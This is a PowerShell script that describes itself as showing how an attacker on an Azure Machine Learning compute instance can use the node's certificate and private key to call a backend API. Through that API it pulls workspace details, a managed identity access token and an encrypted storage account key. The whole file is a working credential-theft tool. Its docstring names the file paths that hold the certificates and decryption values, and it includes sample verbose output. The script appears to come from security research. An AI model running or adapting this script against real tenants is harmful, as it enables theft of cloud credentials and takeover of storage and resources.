<#
    File: Invoke-AzMachineLearninApi.ps1
    Author: Christian Bortone (@xybytes), - 2025
    Description: PowerShell script created to securely obtain workspace details, Azure Managed Identity Token, and storage account key by leveraging the compute instance certificate and key for authentication purposes.
#>

function Invoke-AzMachineLearninApi {
<#
    .SYNOPSIS
        PowerShell script designed to retrieve sensitive information such as storage account keys, workspace data, and the managed identity access token from an Azure Machine Learning compute instance.
    .DESCRIPTION
        This script demonstrates how an attacker accessing compute instance or gaining access through Azure Machine Learning Studio, could exploit the system to retrieve sensitive information. 
        Specifically, the attacker could access storage account keys, workspace data, and the managed identity access token of the instance.
        To interact with the backend API, the attacker would also need the instance's certificate and private key. These are used by the agent to authenticate with the file share and are stored under /mnt/batch/task/startup/certs/. 
        By generating a PFX file, the script can extract the managed identity access key, workspace information, and the AccountKeyJWE. Once decrypted, the AccountKeyJWE provides the storage account key associated with the workspace. 
        To decrypt the AccountKeyJWE you need other two values AZ_LS_ENCRYPTED_SYMMETRIC_KEY and AZ_BATCHAI_CLUSTER_PRIVATE_KEY_PEM. This calue can be found in the file /mnt/batch/tasks/startup/wd/dsi/dsimountenv.
        Details such as NodeId and others can be located in the environment file at /mnt/batch/tasks/startup/wd/dsi/dsimountagentenv.
        Comprehensive information regarding this attack is available in the presentation titled "Breaking ML Services: Finding 0-days in Azure Machine Learning" by Nitesh Surana.
    .PARAMETER SubscriptionId
        The Azure subscription ID to use. If not provided, the user will be prompted to select a subscription from the list.
    .PARAMETER ResourceGroupName
        Name of the resource group to manage.
    .PARAMETER WorkspaceName
        Name of the Azure ML workspace associated with the resource group.
    .PARAMETER ClusterName
        Name of the cluster to manage within the workspace.
    .PARAMETER NodeId
        ID of the specific node within the cluster.
    .PARAMETER PfxPath
        Path to the PFX file containing the certificate.
    .PARAMETER PfxPassword
        Password associated with the PFX file.
    .EXAMPLE
        C:\> Invoke-AzMachineLearninApi -SubscriptionId "5c3b6b7c-1083-4484-b177-56fc44e50c1a" -ResourceGroupName "azure-ml-pt" -WorkspaceName "space03" -ClusterName "chris-pc" -NodeId "tvmps_29abca0373f8720f46894adba78c066ce765f940d3e852dfddf4979fc2ca476b_d" -PfxPath "C:\azureml.pfx" -PfxPassword "password" -Verbose
        VERBOSE: URL: https://eastus2.cert.api.azureml.ms/xdsbatchai/hosttoolapi/subscriptions/5c3b6b7c-1083-4484-b177-56fc44e50c1a/resourceGroups/azure-ml-pt/workspaces/space03/clusters/chris-pc/nodes/tvmps_29abca0373f8720f46894adba78c066ce765f940d3e852dfddf4979fc2ca476b_d?api-version=2018-02-01
        VERBOSE: Loading pfx file
        VERBOSE: Attempting to send api requests
        VERBOSE: POST https://eastus2.cert.api.azureml.ms/xdsbatchai/hosttoolapi/subscriptions/5c3b6b7c-1083-4484-b177-56fc44e50c1a/resourceGroups/azure-ml-pt/workspaces/space03/clusters/chris-pc/nodes/tvmps_29abca0373f8720f46894adba78c066ce765f940d3e852dfddf4979fc2ca476b_d?api-version=2018-02-01 with -1-byte payload
        VERBOSE: received 2279-byte response of content type application/json; charset=utf-8
        VERBOSE: POST https://eastus2.cert.api.azureml.ms/xdsbatchai/hosttoolapi/subscriptions/5c3b6b7c-1083-4484-b177-56fc44e50c1a/resourceGroups/azure-ml-pt/workspaces/space03/clusters/chris-pc/nodes/tvmps_29abca0373f8720f46894adba78c066ce765f940d3e852dfddf4979fc2ca476b_d?api-version=2018-02-01 with -1-byte payload
        VERBOSE: received 1644-byte response of content type application/json; charset=utf-8
        VERBOSE: POST https://eastus2.cert.api.azureml.ms/xdsbatchai/hosttoolapi/subscriptions/5c3b6b7c-1083-4484-b177-56fc44e50c1a/resourceGroups/azure-ml-pt/workspaces/space03/clusters/chris-pc/nodes/tvmps_29abca0373f8720f46894adba78c066ce765f940d3e852dfddf4979fc2ca476b_d?api-version=2018-02-01 with -1-byte payload
        VERBOSE: received 424-byte response of content type application/json; charset=utf-8
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $true, HelpMessage = "Azure Subscription ID.")]
        [string]$SubscriptionId,

        [Parameter(Mandatory = $true, HelpMessage = "Resource group name.")]
        [string]$ResourceGroupName,

        [Parameter(Mandatory = $true, HelpMessage = "Azure ML Workspace name.")]
        [string]$WorkspaceName,

        [Parameter(Mandatory = $true, HelpMessage = "Cluster name.")]
        [string]$ClusterName,

        [Parameter(Mandatory = $true, HelpMessage = "Node ID.")]
        [string]$NodeId,

        [Parameter(Mandatory = $true, HelpMessage = "Path to PFX certificate file.")]
        [string]$PfxPath,

        [Parameter(Mandatory = $true, HelpMessage = "Password for the PFX file.")]
        [string]$PfxPassword
    )

    # Validate login status
    $LoginStatus = Get-AzContext
    if ($null -eq $LoginStatus) {
        Write-Warning "No active Azure login found. Prompting for login."
        try {
            Connect-AzAccount -ErrorAction Stop
            Write-Verbose "Login successful."
        } catch {
            Write-Error "Login process failed. Exiting script."
            return
        }
    }

    # Select subscription
    if ($null -eq $SubscriptionId -or $SubscriptionId -eq "") {
        Write-Host "Subscription ID not provided. Please select a subscription from the list."
        $Subscriptions = Get-AzSubscription -WarningAction SilentlyContinue
        $Subscription = $Subscriptions | Out-GridView -Title "Select a Subscription" -PassThru
        if ($null -eq $Subscription) {
            Write-Error "No subscription selected. Exiting script."
            return
        }
        Select-AzSubscription -SubscriptionId $Subscription.Id | Out-Null
    } else {
        Select-AzSubscription -SubscriptionId $SubscriptionId | Out-Null
    }

    # Validate URL formation
    $url = try {
        "https://eastus2.cert.api.azureml.ms/xdsbatchai/hosttoolapi/subscriptions/{0}/resourceGroups/{1}/workspaces/{2}/clusters/{3}/nodes/{4}?api-version=2018-02-01" -f `
        $SubscriptionId, `
        $ResourceGroupName, `
        $WorkspaceName, `
        $ClusterName, `
        $NodeId
    } catch {
        Write-Error "Error forming the URL. Verify the input parameters."
        return
    }

    Write-Verbose "URL: $url"

    # Prepare request body to obtain workspace data
    $body_getworkspace = @{
        RequestType = "getworkspace"
    } | ConvertTo-Json -Depth 10

    # Prepare the request body to obtain an Azure Managed Identity Access Token
    $body_getaadtoken = @{
        RequestType = "getaadtoken"
        RequestBody = '{"resource":"https://management.azure.com"}'
    } | ConvertTo-Json -Depth 10 -Compress
 
    # Prepare request body necessary to obtain a JWE that includes the access key for the storage account
    $body_getworkspacesecrets = @{
        RequestType = "getworkspacesecrets"
    } | ConvertTo-Json -Depth 10 -Compress

    # HTTP headers
    $headers = @{
        "Accept" = "application/json"
        "Host" = "eastus2.cert.api.azureml.ms"
    }

    # Load PFX certificate
    Write-Verbose "Loading pfx file"
    $cert = try {
        $certificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
        $certificate.Import($PfxPath, $PfxPassword, [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::DefaultKeySet)
        $certificate
    } catch {
        Write-Error "Failed to import the PFX file. Ensure the path and password are correct."
        return
    }

    # Execute HTTPS requests.
    Write-Verbose "Attempting to send api requests"
    $responses = @{}

    foreach ($body in @($body_getworkspace, $body_getaadtoken, $body_getworkspacesecrets)) {
        $requestType = ($body | ConvertFrom-Json).RequestType
        try {
            $response = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json" -Certificate $cert -Headers $headers
            $responses[$requestType] = $response
        } catch {
            Write-Error "Failed to perform $requestType request: $_"
            return
        }
    }

    # Parse responses
    $getworkspace = $responses["getworkspace"].response | ConvertFrom-Json
    $Token = ($responses["getaadtoken"][0].response | ConvertFrom-Json).Token
    $AccountKeyJWE = ($responses["getworkspacesecrets"][0].response | ConvertFrom-Json).AccountKeyJWE

    # Return result
    return [PSCustomObject]@{
        Name                        = $getworkspace.name
        ID                          = $getworkspace.id
        WorkspaceId                 = $getworkspace.properties.workspaceId
        Location                    = $getworkspace.location
        StorageAccount              = $getworkspace.properties.storageAccount
        PublicNetworkAccess         = $getworkspace.properties.publicNetworkAccess
        KeyVault                    = $getworkspace.properties.keyVault
        ipAllowlist                 = $getworkspace.properties.ipAllowlist
        FriendlyName                = $getworkspace.properties.friendlyName
        ProvisioningState           = $getworkspace.properties.provisioningState
        TenantId                    = $getworkspace.properties.tenantId
        ContainerRegistry           = $getworkspace.properties.containerRegistry
        NotebookInfo                = $getworkspace.properties.notebookInfo
        DiscoveryUrl                = $getworkspace.properties.discoveryUrl
        MlFlowTrackingUri           = $getworkspace.properties.mlFlowTrackingUri
        EnableDataIsolation         = $getworkspace.properties.enableDataIsolation
        CredentialType              = $getworkspace.properties.credentialType
        Token                       = $Token
        AccountKeyJWE               = $AccountKeyJWE
    }
}
